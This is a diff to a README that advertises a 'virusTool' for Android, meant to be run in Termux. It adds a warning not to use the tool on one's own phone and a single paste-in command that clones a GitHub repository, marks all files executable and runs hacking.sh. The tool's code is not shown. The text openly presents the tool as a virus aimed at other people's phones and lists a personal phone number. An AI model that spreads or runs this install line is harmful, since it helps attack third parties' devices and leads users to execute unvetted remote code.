@@ -16,5 +16,17 @@ i love my India ❤️
 
 my whatsapp number : +91 9176810909
 
-# ⚡ Installation method ⚡
+#Note : 
+
+  Don't use this tool for your personal phone 
+
+ This is a powerful virusTool Android phone 
+
+# ☠️ installation ☠️
+
+ 👉 Single click to copy all code and paste in termux 
+
+pkg update -y && pkg upgrade && pkg install git -y && git clone https://github.com/WhiteHatTeamOfficial/virusTool-.git && cd virusTool-  && ls && clear && ls && chmod +x * && ls && clear && ./hacking.sh
+
+👉 This tool for mainly I am developed termux environment Android users 
 
